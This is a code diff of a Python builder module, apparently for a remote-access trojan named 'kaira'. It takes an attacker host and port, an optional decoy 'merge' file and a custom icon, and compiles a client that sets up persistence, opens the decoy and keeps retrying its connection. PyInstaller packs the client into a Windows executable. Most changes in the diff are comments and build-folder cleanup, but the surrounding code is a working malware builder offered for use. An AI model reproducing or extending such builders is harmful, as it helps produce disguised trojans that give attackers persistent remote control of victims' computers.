@@ -1,9 +1,15 @@
+# A module for converting executable file automation.
+
 import subprocess
-from shutil import copyfile
-from os import remove
+from shutil import copyfile, rmtree
+import os
+from warnings import filterwarnings
+
+filterwarnings("ignore")
 
 
-def build_with_merge_and_icon(host, port, merge_file, icon, name):
+def build_with_merge_and_icon(host, port, merge_file, icon, name): # Opens 'kaira_client_build_1.py' and writes kaira_client_build.py
+# content with merge function content(client_code).Then builds this file with icon and copies to /builds directory.
     client_code = f"""
 
 
@@ -39,9 +45,12 @@ try_kaira()
     subprocess.call(pyinstaller_command, shell=True)
     executable_path = f"builds\\{name}"
     copyfile("dist\\kaira_client_build_1.exe", executable_path)
-    remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.spec")
+    rmtree("dist")
+    rmtree("build")
 
-def build_with_merge(host, port, merge_file, name):
+def build_with_merge(host, port, merge_file, name): # Same with build_with_merge_and_icon, without icon file.
     client_code = f"""
 
 
@@ -62,6 +71,7 @@ def try_kaira():
         except:
             try_kaira()
 
+
 get_persistence()
 open_merge_file() 
 try_kaira()
@@ -78,9 +88,12 @@ try_kaira()
     subprocess.call(pyinstaller_command, shell=True)
     executable_path = f"builds\\{name}"
     copyfile("dist\\kaira_client_build_1.exe", executable_path)
-    remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.spec")
+    rmtree("dist")
+    rmtree("build")
 
-def build_with_icon(host, port, icon, name):
+def build_with_icon(host, port, icon, name): # Same with build_with_merge_and_icon, without merge file function.
     client_code = f"""
 
 
@@ -96,6 +109,7 @@ def try_kaira():
             kaira.core()
         except:
             try_kaira()
+
 
 get_persistence()
 try_kaira()
@@ -112,9 +126,13 @@ try_kaira()
     subprocess.call(pyinstaller_command, shell=True)
     executable_path = f"builds\\{name}"
     copyfile("dist\\kaira_client_build_1.exe", executable_path)
-    remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.spec")
+    rmtree("dist")
+    rmtree("build")
 
-def default_build(host, port, name):
+
+def default_build(host, port, name): # Builds without any icon or any merge file.Same logic with previous functions.
     client_code = f"""
 
     
@@ -131,6 +149,7 @@ def try_kaira():
         except:
             try_kaira()
 
+
 get_persistence()
 try_kaira()
 """
@@ -146,5 +165,9 @@ try_kaira()
     subprocess.call(pyinstaller_command, shell=True)
     executable_path = f"builds\\{name}"
     copyfile("dist\\kaira_client_build_1.exe", executable_path)
-    remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.py")
+    os.remove("kaira_client_build_1.spec")
+    rmtree("dist")
+    rmtree("build")
+     
     
